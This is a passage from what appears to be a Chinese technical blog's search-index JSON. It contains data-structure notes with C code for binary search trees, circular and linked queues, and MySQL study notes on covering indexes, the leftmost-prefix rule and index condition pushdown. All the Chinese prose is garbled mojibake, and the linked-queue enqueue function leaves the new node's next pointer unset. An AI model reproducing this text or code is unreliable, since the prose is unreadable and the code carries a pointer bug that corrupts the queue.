‘çš„å®šä¹‰ç®€å•åœ°ç†è§£ï¼Œæ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶çš„æ ‘å°±æ˜¯äºŒå‰æ ‘ï¼š æœ¬èº«æ˜¯æœ‰åºæ ‘ï¼› æ ‘ä¸­åŒ…å«çš„å„ä¸ªèŠ‚ç‚¹çš„åº¦ä¸èƒ½è¶…è¿‡ 2ï¼Œå³åªèƒ½æ˜¯ 0ã€1 æˆ–è€… 2ï¼› äºŒå‰æœç´¢æ ‘ï¼ˆåˆå«åšäºŒå‰æŸ¥æ‰¾æ ‘æˆ–äºŒå‰æ’åºæ ‘ï¼‰å…·å¤‡ä»¥ä¸‹ç‰¹ç‚¹ï¼š æ¯ä¸ªç»“ç‚¹çš„å€¼å‡å¤§äºå…¶å·¦å­æ ‘ä¸Šçš„ä»»æ„ä¸€ä¸ªç»“ç‚¹çš„å€¼ æ¯ä¸ªç»“ç‚¹çš„å€¼å‡å°äºå…¶å³å­æ ‘ä¸Šä»»æ„ä¸€ä¸ªç»“ç‚¹çš„å€¼ äºŒå‰æœç´¢æ ‘çš„åŸºæœ¬æ“ä½œï¼š BSTNode* BST_Search(BSTree T, int key);ï¼šæŸ¥æ‰¾å…³é”®å­— (éé€’å½’ç‰ˆæœ¬) BSTNode* BST_SearchR(BSTree T, int key);ï¼šæŸ¥æ‰¾å…³é”®å­— (é€’å½’ç‰ˆæœ¬) bool BST_Insert(BSTree &amp;T, int key);ï¼šäºŒå‰æ’åºæ ‘æ’å…¥æ“ä½œ void BST_Create(BSTree &amp;T, int *elems, int n);ï¼šæ„é€ äºŒå‰æ’åºæ ‘ äºŒå‰æœç´¢æ ‘çš„å®ç°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687/** * äºŒå‰æ’åºæ ‘ */typedef struct BSTNode&#123; int data; struct BSTNode *lchild, *rchild;&#125; BSTNode, *BSTree;/** * äºŒå‰æ’åºæ ‘çš„æ’å…¥æ“ä½œ * * @param T * @param i * @return */bool BST_Insert(BSTree &amp;T, int key)&#123; // é¦–å…ˆåˆ¤æ–­æ˜¯å¦æ˜¯æ ‘æ ¹ if (NULL == T) &#123; // ä¸ºæ–°èŠ‚ç‚¹ç”³è¯·ç©ºé—´ T = (BSTree)malloc(sizeof(BSTNode)); T-&gt;data = key; T-&gt;lchild = T-&gt;rchild = NULL; &#125; else if (key == T-&gt;data) &#123; // å‘ç°ç›¸åŒå…ƒç´  return false; &#125; else if (key &lt; T-&gt;data) &#123; // å¦‚æœè¦æ’å…¥çš„ç»“ç‚¹ï¼Œå°äºå½“å‰ç»“ç‚¹ï¼Œå°†æ’å…¥å·¦å­æ ‘ return BST_Insert(T-&gt;lchild, key); &#125; else &#123; // å¦‚æœè¦æ’å…¥çš„ç»“ç‚¹ï¼Œå¤§äºå½“å‰ç»“ç‚¹ï¼Œåˆ™æ’å…¥å³å­æ ‘ return BST_Insert(T-&gt;rchild, key); &#125;&#125;;/** * æ„é€ äºŒå‰æ’åºæ ‘ * * @param T * @param elems * @param n */void BST_Create(BSTree &amp;T, int elems[], int n)&#123; int i = 0; while (i &lt; n) &#123; BST_Insert(T, elems[i]); i++; &#125;&#125;;/** * éé€’å½’æœç´¢å­æ ‘ * * @param T * @param key * @param p * @return */BSTree BST_Search(BSTree T, int key) &#123; while (T != NULL &amp;&amp; T-&gt;data != key) &#123; if (T-&gt;data &lt; key) &#123; // å¦‚æœ key å¤§äºå½“å‰ç»“ç‚¹åˆ™è¿”å›å³å­æ ‘ T = T-&gt;rchild; &#125; else &#123; // å¦‚æœ key å°äºå½“å‰ç»“ç‚¹åˆ™è¿”å›å·¦å­æ ‘ T = T-&gt;lchild; &#125; &#125; return T;&#125;;/** * é€’å½’æœç´¢å­æ ‘ * * @param T * @param key * @return */BSTree BST_SearchR(BSTree T, int key)&#123; if (T != NULL &amp;&amp; T-&gt;data != key) &#123; if (T-&gt;data &lt; key) &#123; return BST_SearchR(T-&gt;rchild, key); &#125; else if (T-&gt;data &gt; key) &#123; return BST_SearchR(T-&gt;lchild, key); &#125; &#125; return T;&#125;; å‚è€ƒé“¾æ¥ æ•°æ®ç»“æ„çš„æ ‘å­˜å‚¨ç»“æ„","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://www.0x2beace.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://www.0x2beace.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"æ•°æ®ç»“æ„ï¼ˆå››ï¼‰é˜Ÿåˆ—","slug":"data-structure-4-queue","date":"2022-06-06T15:33:54.000Z","updated":"2022-06-17T07:35:22.676Z","comments":true,"path":"data-structure-4-queue/","link":"","permalink":"https://www.0x2beace.com/data-structure-4-queue/","excerpt":"é˜Ÿåˆ—çš„å®šä¹‰ä¸æ ˆç»“æ„ä¸åŒçš„æ˜¯ï¼Œé˜Ÿåˆ—çš„ä¸¤ç«¯éƒ½â€å¼€å£â€ï¼Œè¦æ±‚æ•°æ®åªèƒ½ä»ä¸€ç«¯è¿›ï¼Œä»å¦ä¸€ç«¯å‡ºï¼Œéµå¾ª â€œå…ˆè¿›å…ˆå‡º FIFO (First In First Out)â€ çš„åŸåˆ™ã€‚","text":"é˜Ÿåˆ—çš„å®šä¹‰ä¸æ ˆç»“æ„ä¸åŒçš„æ˜¯ï¼Œé˜Ÿåˆ—çš„ä¸¤ç«¯éƒ½â€å¼€å£â€ï¼Œè¦æ±‚æ•°æ®åªèƒ½ä»ä¸€ç«¯è¿›ï¼Œä»å¦ä¸€ç«¯å‡ºï¼Œéµå¾ª â€œå…ˆè¿›å…ˆå‡º FIFO (First In First Out)â€ çš„åŸåˆ™ã€‚ é€šå¸¸ï¼Œç§°è¿›æ•°æ®çš„ä¸€ç«¯ä¸º â€œé˜Ÿå°¾â€ï¼Œå‡ºæ•°æ®çš„ä¸€ç«¯ä¸º â€œé˜Ÿå¤´â€ï¼Œæ•°æ®å…ƒç´ è¿›é˜Ÿåˆ—çš„è¿‡ç¨‹ç§°ä¸º â€œå…¥é˜Ÿâ€ï¼Œå‡ºé˜Ÿåˆ—çš„è¿‡ç¨‹ç§°ä¸º â€œå‡ºé˜Ÿâ€ã€‚ âš ï¸ æ ˆå’Œé˜Ÿåˆ—ä¸è¦æ··æ·†ï¼Œæ ˆç»“æ„æ˜¯ä¸€ç«¯å°å£ï¼Œç‰¹ç‚¹æ˜¯â€å…ˆè¿›åå‡ºâ€ï¼›è€Œé˜Ÿåˆ—çš„ä¸¤ç«¯å…¨æ˜¯å¼€å£ï¼Œç‰¹ç‚¹æ˜¯â€å…ˆè¿›å…ˆå‡ºâ€ã€‚ é˜Ÿåˆ—çš„é¡ºåºå­˜å‚¨ï¼ˆå¾ªç¯é˜Ÿåˆ—ï¼‰åœ¨é¡ºåºè¡¨çš„åŸºç¡€ä¸Šå®ç°çš„é˜Ÿåˆ—ç»“æ„ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#define MaxSize 100 // å®šä¹‰é˜Ÿåˆ—ä¸­å…ƒç´ çš„æœ€å¤§ä¸ªæ•°/** * é˜Ÿåˆ—çš„é¡ºåºå­˜å‚¨ (å¾ªç¯é˜Ÿåˆ—) */typedef int ElemType; // å…ƒç´ æ•°æ®ç±»å‹typedef struct SqQueue&#123; ElemType data[MaxSize]; // å­˜æ”¾é˜Ÿåˆ—å…ƒç´  int front; // é˜Ÿé¦– int rear; // å¯¹å¤´&#125; SqQueue;/** * åˆå§‹åŒ–é˜Ÿåˆ— * * @param Q */void InitQueue(SqQueue &amp;Q)&#123; Q.rear = Q.front = 0;&#125;;/** * åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º * * @param Q * @return */bool QueueEmpty(SqQueue Q)&#123; // å½“é˜Ÿåˆ—ä¸­æ²¡æœ‰å…ƒç´ æ—¶ï¼Œå¯¹é¦–å’Œé˜Ÿå°¾æŒ‡å‘åŒä¸€å—åœ°å€ if (Q.rear == Q.front) &#123; return true; &#125; return false;&#125;;/** * å…¥é˜Ÿ * * @param Q * @param x * @return */bool EnQueue(SqQueue &amp;Q, ElemType x)&#123; // åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦å·²æ»¡ if ((Q.rear + 1) %MaxSize == Q.front) &#123; return false; &#125; // æ¯æ¬¡æ–°å…ƒç´ å…¥é˜Ÿæ—¶ï¼Œé˜Ÿå°¾éƒ½éœ€è¦ \"+1\"ï¼Œæ–¹ä¾¿ä¸‹ä¸€æ¬¡å¯ä»¥æ–°å…ƒç´ ç›´æ¥å…¥é˜Ÿ Q.data[Q.rear] = x; Q.rear = (Q.rear + 1) % MaxSize; return true;&#125;;bool DeQueue(SqQueue &amp;Q, ElemType &amp;x)&#123; // åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º if (QueueEmpty(Q)) &#123; return false; &#125; // æ¯æ¬¡æ—§å…ƒç´ å‡ºå¯¹æ—¶ï¼Œå¯¹å¤´éƒ½éœ€è¦ \"+1\"ï¼ŒæŒ‡å‘æ–°çš„å¯¹å¤´ x = Q.data[Q.front]; // å–ä½™çš„ç›®çš„æ˜¯ä¸ºäº†ä½¿å¾ªç¯é˜Ÿåˆ—çš„å°¾éƒ¨å›åˆ°å¤´éƒ¨ Q.front = (Q.front + 1) % MaxSize; return true;&#125;;/** * è·å–é˜Ÿåˆ—é•¿åº¦ * * @param Q * @return */int QueueLength(SqQueue Q)&#123; return (Q.rear-Q.front+MaxSize) % MaxSize;&#125;; é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨åœ¨é“¾è¡¨çš„åŸºç¡€ä¸Šå®ç°çš„é˜Ÿåˆ—ç»“æ„ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576/** * é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨ */// é˜Ÿåˆ—ç»“æ„ä½“typedef struct &#123; LinkNode *front; // é“¾è¡¨å¤´ LinkNode *rear; // é“¾è¡¨å°¾&#125;LinkQueue;/** * åˆå§‹åŒ–é˜Ÿåˆ— * * @param Q */void InitLinkQueue(LinkQueue &amp;Q)&#123; // ç”³è¯·ä¸€ä¸ªå¤´ç»“ç‚¹ï¼Œå¤´å’Œå°¾æŒ‡å‘åŒä¸€ä¸ªèŠ‚ç‚¹ Q.front = Q.rear = (LinkNode *) malloc(sizeof(LinkNode)); Q.front-&gt;next = NULL;&#125;;/** * åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º * * @param Q * @return */bool LinkQueueEmpty(LinkQueue Q)&#123; // å¤´å’Œå°¾æŒ‡å‘åŒä¸€ä¸ªèŠ‚ç‚¹å³ä¸ºç©º if (Q.front == Q.rear) &#123; return true; &#125; return false;&#125;;/** * å…¥é˜Ÿï¼ˆå°¾æ’æ³•ï¼‰ * * @param Q * @param x * @return */void EnLinkQueue(LinkQueue &amp;Q, ElemType x)&#123; LinkNode *s = (LinkNode*) malloc(sizeof (LinkNode)); s-&gt;data = x; Q.rear-&gt;next = s; Q.rear = s;&#125;;/** * å‡ºé˜Ÿï¼ˆå¤´éƒ¨åˆ é™¤æ³•ï¼‰ * * @param Q * @param x * @return */bool DeLinkQueue(LinkQueue &amp;Q, ElemType &amp;x)&#123; if (LinkQueueEmpty(Q)) &#123; return false; &#125; // å› ä¸ºæ˜¯å…ˆè¿›å…ˆå‡ºï¼Œæ‰€ä»¥å¤´éƒ¨åˆ é™¤æ³•ï¼Œåˆ é™¤çš„æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´  LinkNode *p; p = Q.front-&gt;next; x = p-&gt;data; Q.front-&gt;next = p-&gt;next; // è¿™é‡Œéœ€è¦åˆ¤æ–­åˆ é™¤èŠ‚ç‚¹æ˜¯å¦æ˜¯æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¦‚æœæ˜¯åˆ™éœ€è¦æŠŠå¤´å’Œå°¾æŒ‡å‘åŒä¸€ä¸ªèŠ‚ç‚¹ if (Q.rear == p) &#123; Q.rear = Q.front; &#125; free(p); return true;&#125;;","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://www.0x2beace.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://www.0x2beace.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"05 æ·±å…¥æµ…å‡ºç´¢å¼•ï¼ˆä¸‹ï¼‰","slug":"introduction-to-the-index-part-2","date":"2022-06-05T11:25:57.000Z","updated":"2022-06-17T07:35:22.678Z","comments":true,"path":"introduction-to-the-index-part-2/","link":"","permalink":"https://www.0x2beace.com/introduction-to-the-index-part-2/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š è¦†ç›–ç´¢å¼•ä¼˜åŒ–ï¼Œé¿å…å¤šæ¬¡å›è¡¨ äº†è§£è”åˆç´¢å¼•åŠæœ€å·¦å‰ç¼€åŸåˆ™ äº†è§£ç´¢å¼•ä¸‹æ¨","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š è¦†ç›–ç´¢å¼•ä¼˜åŒ–ï¼Œé¿å…å¤šæ¬¡å›è¡¨ äº†è§£è”åˆç´¢å¼•åŠæœ€å·¦å‰ç¼€åŸåˆ™ äº†è§£ç´¢å¼•ä¸‹æ¨ è¦†ç›–ç´¢å¼•æœ‰ä¸€å¼ åˆå§‹è¡¨ Tï¼š 12345678mysql&gt; create table T (ID int primary key,k int NOT NULL DEFAULT 0, s varchar(16) NOT NULL DEFAULT &#39;&#39;,index k(k))engine&#x3D;InnoDB; insert into T values(100,1, &#39;aa&#39;),(200,2,&#39;bb&#39;),(300,3,&#39;cc&#39;),(500,5,&#39;ee&#39;),(600,6,&#39;ff&#39;),(700,7,&#39;gg&#39;); æ­¤æ—¶æ‰§è¡Œ select * from T where k between 3 and 5ï¼Œéœ€è¦æ‰§è¡Œå‡ æ¬¡æ ‘çš„æœç´¢æ“ä½œï¼Œä¼šæ‰«æå¤šå°‘è¡Œï¼Ÿ ä¸Šé¢é‚£æ¡ SQL æŸ¥è¯¢è¯­å¥çš„æ‰§è¡Œæµç¨‹ï¼š åœ¨ k ç´¢å¼•æ ‘ä¸Šæ‰¾åˆ° k=3 çš„è®°å½•ï¼Œå–å¾— ID = 300ï¼› å†åˆ° ID ç´¢å¼•æ ‘æŸ¥åˆ° ID=300 å¯¹åº”çš„ R3ï¼› åœ¨ k ç´¢å¼•æ ‘å–ä¸‹ä¸€ä¸ªå€¼ k=5ï¼Œå–å¾— ID=500ï¼› å†å›åˆ° ID ç´¢å¼•æ ‘æŸ¥åˆ° ID=500 å¯¹åº”çš„ R4ï¼› åœ¨ k ç´¢å¼•æ ‘å–ä¸‹ä¸€ä¸ªå€¼ k=6ï¼Œä¸æ»¡è¶³æ¡ä»¶ï¼Œå¾ªç¯ç»“æŸã€‚ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå›åˆ°ä¸»é”®ç´¢å¼•æ ‘æœç´¢çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬ç§°ä¸ºå›è¡¨ã€‚å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªæŸ¥è¯¢è¿‡ç¨‹è¯»äº† k ç´¢å¼•æ ‘çš„ 3 æ¡è®°å½•ï¼ˆæ­¥éª¤ 1ã€3 å’Œ 5ï¼‰ï¼Œå›è¡¨äº†ä¸¤æ¬¡ï¼ˆæ­¥éª¤ 2 å’Œ 4ï¼‰ã€‚ åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç”±äºæŸ¥è¯¢ç»“æœæ‰€éœ€è¦çš„æ•°æ®åªåœ¨ä¸»é”®ç´¢å¼•ä¸Šæœ‰ï¼Œæ‰€ä»¥ä¸å¾—ä¸å›è¡¨ã€‚é‚£ä¹ˆï¼Œæœ‰æ²¡æœ‰å¯èƒ½ç»è¿‡ç´¢å¼•ä¼˜åŒ–ï¼Œé¿å…å›è¡¨è¿‡ç¨‹å‘¢ï¼Ÿ å¦‚æœæ‰§è¡Œçš„è¯­å¥æ˜¯ select ID from T where k between 3 and 5ï¼Œè¿™æ—¶åªéœ€è¦æŸ¥ ID çš„å€¼ï¼Œè€Œ ID çš„å€¼å·²ç»åœ¨ k ç´¢å¼•æ ‘ä¸Šäº†ï¼Œå› æ­¤å¯ä»¥ç›´æ¥æä¾›æŸ¥è¯¢ç»“æœï¼Œä¸éœ€è¦é€šè¿‡å›è¡¨æ‰èƒ½æ‹¿åˆ°ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨è¿™ä¸ªæŸ¥è¯¢é‡Œé¢ï¼Œç´¢å¼• k å·²ç»â€œè¦†ç›–äº†â€æˆ‘ä»¬çš„æŸ¥è¯¢éœ€æ±‚ï¼Œæˆ‘ä»¬ç§°ä¸ºè¦†ç›–ç´¢å¼•ã€‚ ç”±äºè¦†ç›–ç´¢å¼•å¯ä»¥å‡å°‘æ ‘çš„æœç´¢æ¬¡æ•°ï¼Œæ˜¾è‘—æå‡æŸ¥è¯¢æ€§èƒ½ï¼Œæ‰€ä»¥ä½¿ç”¨è¦†ç›–ç´¢å¼•æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„æ€§èƒ½ä¼˜åŒ–æ‰‹æ®µã€‚ æœ€å·¦å‰ç¼€åŸåˆ™ä¸ºäº†æé«˜å¤šæ¡ä»¶æŸ¥è¯¢æ•ˆç‡ï¼Œå¯å»ºç«‹è”åˆç´¢å¼•ï¼Œéµå¾ªâ€æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™â€œã€‚ æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™æ˜¯æŒ‡åœ¨ä½¿ç”¨ B+Tree è”åˆç´¢å¼•è¿›è¡Œæ•°æ®æ£€ç´¢æ—¶ï¼ŒMySQL ä¼˜åŒ–å™¨ä¼šè¯»å–è°“è¯ï¼ˆè¿‡æ»¤æ¡ä»¶ï¼‰å¹¶æŒ‰ç…§è”åˆç´¢å¼•å­—æ®µåˆ›å»ºé¡ºåºä¸€ç›´å‘å³åŒ¹é…ç›´åˆ°é‡åˆ°èŒƒå›´æŸ¥è¯¢æˆ–éç­‰å€¼æŸ¥è¯¢ååœæ­¢åŒ¹é…ï¼Œæ­¤å­—æ®µä¹‹åçš„ç´¢å¼•åˆ—ä¸ä¼šè¢«ä½¿ç”¨ã€‚ å‡å¦‚æ­¤æ—¶æœ‰ä¸€å¼ å¸‚æ°‘è¡¨æ˜¯è¿™æ ·å®šä¹‰çš„ï¼š 12345678910CREATE TABLE &#96;tuser&#96; ( &#96;id&#96; int(11) NOT NULL, &#96;id_card&#96; varchar(32) DEFAULT NULL, &#96;name&#96; varchar(32) DEFAULT NULL, &#96;age&#96; int(11) DEFAULT NULL, &#96;ismale&#96; tinyint(1) DEFAULT NULL, PRIMARY KEY (&#96;id&#96;), KEY &#96;id_card&#96; (&#96;id_card&#96;), KEY &#96;name_age&#96; (&#96;name&#96;,&#96;age&#96;)) ENGINE&#x3D;InnoDB æˆ‘ä»¬ç”¨ï¼ˆnameï¼Œageï¼‰è¿™ä¸ªè”åˆç´¢å¼•æ¥åˆ†æã€‚ å¯ä»¥çœ‹åˆ°ï¼Œç´¢å¼•é¡¹æ˜¯æŒ‰ç…§ç´¢å¼•å®šä¹‰é‡Œé¢å‡ºç°çš„å­—æ®µé¡ºåºæ’åºçš„ã€‚ å½“ä½ çš„é€»è¾‘éœ€æ±‚æ˜¯æŸ¥åˆ°æ‰€æœ‰åå­—æ˜¯â€œå¼ ä¸‰â€çš„äººæ—¶ï¼Œå¯ä»¥å¿«é€Ÿå®šä½åˆ° ID4ï¼Œç„¶åå‘åéå†å¾—åˆ°æ‰€æœ‰éœ€è¦çš„ç»“æœã€‚ å¦‚æœä½ è¦æŸ¥çš„æ˜¯æ‰€æœ‰åå­—ç¬¬ä¸€ä¸ªå­—æ˜¯â€œå¼ â€çš„äººï¼Œä½ çš„ SQL è¯­å¥çš„æ¡ä»¶æ˜¯â€where name like â€˜å¼  %â€™â€ã€‚è¿™æ—¶ï¼Œä½ ä¹Ÿèƒ½å¤Ÿç”¨ä¸Šè¿™ä¸ªç´¢å¼•ï¼ŒæŸ¥æ‰¾åˆ°ç¬¬ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„è®°å½•æ˜¯ ID3ï¼Œç„¶åå‘åéå†ï¼Œç›´åˆ°ä¸æ»¡è¶³æ¡ä»¶ä¸ºæ­¢ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œä¸åªæ˜¯ç´¢å¼•çš„å…¨éƒ¨å®šä¹‰ï¼Œåªè¦æ»¡è¶³æœ€å·¦å‰ç¼€ï¼Œå°±å¯ä»¥åˆ©ç”¨ç´¢å¼•æ¥åŠ é€Ÿæ£€ç´¢ã€‚è¿™ä¸ªæœ€å·¦å‰ç¼€å¯ä»¥æ˜¯è”åˆç´¢å¼•çš„æœ€å·¦ N ä¸ªå­—æ®µï¼Œä¹Ÿå¯ä»¥æ˜¯å­—ç¬¦ä¸²ç´¢å¼•çš„æœ€å·¦ M ä¸ªå­—ç¬¦ã€‚ å¦‚æœé€šè¿‡è°ƒæ•´é¡ºåºï¼Œå¯ä»¥å°‘ç»´æŠ¤ä¸€ä¸ªç´¢å¼•ï¼Œé‚£ä¹ˆè¿™ä¸ªé¡ºåºå¾€å¾€å°±æ˜¯éœ€è¦ä¼˜å…ˆè€ƒè™‘é‡‡ç”¨çš„ã€‚ æ‰€ä»¥å½“å·²ç»æœ‰äº† (a,b) è¿™ä¸ªè”åˆç´¢å¼•åï¼Œä¸€èˆ¬å°±ä¸éœ€è¦å•ç‹¬åœ¨ a ä¸Šå»ºç«‹ç´¢å¼•äº†ã€‚ é‚£ä¹ˆï¼Œå¦‚æœæ—¢æœ‰è”åˆæŸ¥è¯¢ï¼Œåˆæœ‰åŸºäº aã€b å„è‡ªçš„æŸ¥è¯¢å‘¢ï¼ŸæŸ¥è¯¢æ¡ä»¶é‡Œé¢åªæœ‰ b çš„è¯­å¥ï¼Œæ˜¯æ— æ³•ä½¿ç”¨ (a,b) è¿™ä¸ªè”åˆç´¢å¼•çš„ï¼Œè¿™æ—¶å€™ä½ ä¸å¾—ä¸ç»´æŠ¤å¦å¤–ä¸€ä¸ªç´¢å¼•ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ éœ€è¦åŒæ—¶ç»´æŠ¤ (a,b)ã€(b) è¿™ä¸¤ä¸ªç´¢å¼•ã€‚ è¿™æ—¶å€™ï¼Œæˆ‘ä»¬è¦è€ƒè™‘çš„åŸåˆ™å°±æ˜¯ç©ºé—´äº†ã€‚æ¯”å¦‚ä¸Šé¢è¿™ä¸ªå¸‚æ°‘è¡¨çš„æƒ…å†µï¼Œname å­—æ®µæ˜¯æ¯” age å­—æ®µå¤§çš„ ï¼Œé‚£æˆ‘å°±å»ºè®®ä½ åˆ›å»ºä¸€ä¸ªï¼ˆname,age) çš„è”åˆç´¢å¼•å’Œä¸€ä¸ª (age) çš„å•å­—æ®µç´¢å¼•ã€‚ ç´¢å¼•ä¸‹æ¨è¿˜æ˜¯ä»¥å¸‚æ°‘è¡¨çš„è”åˆç´¢å¼•ï¼ˆname, ageï¼‰ä¸ºä¾‹ã€‚å¦‚æœç°åœ¨æœ‰ä¸€ä¸ªéœ€æ±‚ï¼šæ£€ç´¢å‡ºè¡¨ä¸­â€œåå­—ç¬¬ä¸€ä¸ªå­—æ˜¯å¼ ï¼Œè€Œä¸”å¹´é¾„æ˜¯ 10 å²çš„æ‰€æœ‰ç”·å­©â€ã€‚é‚£ä¹ˆï¼ŒSQL è¯­å¥æ˜¯è¿™ä¹ˆå†™çš„ï¼š 1mysql&gt; select * from tuser where name like &#39;å¼  %&#39; and age&#x3D;10 and ismale&#x3D;1; ä½ å·²ç»çŸ¥é“äº†å‰ç¼€ç´¢å¼•è§„åˆ™ï¼Œæ‰€ä»¥è¿™ä¸ªè¯­å¥åœ¨æœç´¢ç´¢å¼•æ ‘çš„æ—¶å€™ï¼Œåªèƒ½ç”¨ â€œå¼ â€ï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„è®°å½• ID3ã€‚å½“ç„¶ï¼Œè¿™è¿˜ä¸é”™ï¼Œæ€»æ¯”å…¨è¡¨æ‰«æè¦å¥½ã€‚ åœ¨ MySQL 5.6 ä¹‹å‰ï¼Œåªèƒ½ä» ID3 å¼€å§‹ä¸€ä¸ªä¸ªå›è¡¨ã€‚åˆ°ä¸»é”®ç´¢å¼•ä¸Šæ‰¾å‡ºæ•°æ®è¡Œï¼Œå†å¯¹æ¯”å­—æ®µå€¼ã€‚ è€Œ MySQL 5.6 å¼•å…¥çš„ç´¢å¼•ä¸‹æ¨ä¼˜åŒ–ï¼ˆindex condition pushdown)ï¼Œ å¯ä»¥åœ¨ç´¢å¼•éå†è¿‡ç¨‹ä¸­ï¼Œå¯¹ç´¢å¼•ä¸­åŒ…å«çš„å­—æ®µå…ˆåšåˆ¤æ–­ï¼Œç›´æ¥è¿‡æ»¤æ‰ä¸æ»¡è¶³æ¡ä»¶çš„è®°å½•ï¼Œå‡å°‘å›è¡¨æ¬¡æ•°ã€‚ æ— ç´¢å¼•ä¸‹æ¨æ‰§è¡Œæµç¨‹ï¼š åœ¨ä¸Šå›¾ä¸­ï¼Œåœ¨ (name,age) ç´¢å¼•é‡Œé¢ç‰¹æ„å»æ‰äº† age çš„å€¼ï¼Œè¿™ä¸ªè¿‡ç¨‹ InnoDB å¹¶ä¸ä¼šå»çœ‹ age çš„å€¼ï¼Œåªæ˜¯æŒ‰é¡ºåºæŠŠâ€œname ç¬¬ä¸€ä¸ªå­—æ˜¯â€™å¼ â€™â€çš„è®°å½•ä¸€æ¡æ¡å–å‡ºæ¥å›è¡¨ã€‚å› æ­¤ï¼Œéœ€è¦å›è¡¨ 4 æ¬¡ã€‚ ç´¢å¼•ä¸‹æ¨æ‰§è¡Œæµç¨‹ï¼š InnoDB åœ¨ (name,age) ç´¢å¼•å†…éƒ¨å°±åˆ¤æ–­äº† age æ˜¯å¦ç­‰äº 10ï¼Œå¯¹äºä¸ç­‰äº 10 çš„è®°å½•ï¼Œç›´æ¥åˆ¤æ–­å¹¶è·³è¿‡ã€‚åœ¨æˆ‘ä»¬çš„è¿™ä¸ªä¾‹å­ä¸­ï¼Œåªéœ€è¦å¯¹ ID4ã€ID5 è¿™ä¸¤æ¡è®°å½•å›è¡¨å–æ•°æ®åˆ¤æ–­ï¼Œå°±åªéœ€è¦å›è¡¨ 2 æ¬¡ã€‚ æ€»ç»“ è¦†ç›–ç´¢å¼•ï¼šå¦‚æœæŸ¥è¯¢æ¡ä»¶ä½¿ç”¨çš„æ˜¯æ™®é€šç´¢å¼•ï¼ˆæˆ–æ˜¯è”åˆç´¢å¼•çš„æœ€å·¦åŸåˆ™å­—æ®µï¼‰ï¼ŒæŸ¥è¯¢ç»“æœæ˜¯è”åˆç´¢å¼•çš„å­—æ®µæˆ–ä¸»é”®ï¼Œæ­¤æ—¶ä¸ç”¨é¢å¤–å›è¡¨ï¼Œç›´æ¥è¿”å›ç»“æœï¼Œå‡å°‘IOç£ç›˜è¯»å†™è¯»å–æ­£è¡Œæ•°æ®ã€‚ æœ€å·¦å‰ç¼€åŸåˆ™ï¼šè”åˆç´¢å¼•çš„æœ€å·¦ N ä¸ªå­—æ®µï¼Œä¹Ÿå¯ä»¥æ˜¯å­—ç¬¦ä¸²ç´¢å¼•çš„æœ€å·¦ M ä¸ªå­—ç¬¦ã€‚ è”åˆç´¢å¼•ï¼šæ ¹æ®åˆ›å»ºè”åˆç´¢å¼•çš„é¡ºåºï¼Œä»¥æœ€å·¦åŸåˆ™è¿›è¡Œ where æ£€ç´¢ï¼Œæ¯”å¦‚(name, age) è¿™ä¸ªè”åˆç´¢å¼•ï¼Œä»¥ name = â€˜å¼ ä¸‰â€™ æˆ– name=â€˜å¼ ä¸‰â€™ and age= 1 æ—¶å¯ä»¥ä½¿ç”¨ç´¢å¼•ï¼Œä½†å•ç‹¬ä½¿ç”¨ age = 1 æ—¶ï¼Œä¸ä¼šä½¿ç”¨ç´¢å¼•ï¼Œè€ƒè™‘åˆ°å­˜å‚¨ç©ºé—´çš„é—®é¢˜ï¼Œè¿˜è¯·æ 